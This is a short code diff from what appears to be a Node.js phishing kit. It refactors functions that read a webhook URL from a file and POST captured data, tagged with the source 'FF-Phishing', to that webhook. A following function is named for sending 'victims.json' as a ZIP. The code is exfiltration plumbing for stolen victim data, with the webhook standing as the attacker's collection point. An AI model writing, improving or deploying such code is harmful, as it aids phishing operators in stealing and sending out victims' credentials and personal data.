@@ -9,11 +9,12 @@ const FormData = require('form-data');
 // Get webhook URL from file
 function getWebhookURL() {
   try {
-    const webhookPath = path.join(__dirname, '..', process.env.WEBHOOK_FILE);
+    const fileName = process.env.WEBHOOK_FILE || 'webhook.txt';
+    const webhookPath = path.join(__dirname, '..', fileName);
     const webhook = fs.readFileSync(webhookPath, 'utf8').trim();
     return webhook;
   } catch (err) {
-    console.error('Error reading webhook.txt:', err.message);
+    console.error('❌ Error reading webhook file:', err.message);
     return null;
   }
 }
@@ -21,23 +22,31 @@ function getWebhookURL() {
 // Send to webhook
 async function sendToWebhook(data) {
   const webhookURL = getWebhookURL();
+  
   if (!webhookURL || !webhookURL.startsWith('http')) {
-    console.log('⚠️  No valid webhook configured');
+    console.log('⚠️  No valid webhook URL found');
     return;
   }
 
   try {
-    // Send raw data as JSON
-    await axios.post(webhookURL, {
+    const payload = {
       ...data,
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
+      source: 'FF-Phishing'
+    };
+
+    const response = await axios.post(webhookURL, payload, {
+      headers: {
+        'Content-Type': 'application/json'
+      }
     });
 
-    console.log('✅ Data sent to webhook');
+    console.log('✅ Data sent to webhook successfully');
   } catch (err) {
-    console.error('❌ Failed to send to webhook:', err.response?.data || err.message);
+    console.error('❌ Webhook error:', err.response?.data || err.message);
   }
 }
+
 
 // Send victims.json as ZIP to webhook
 async function sendZipToWebhook() {
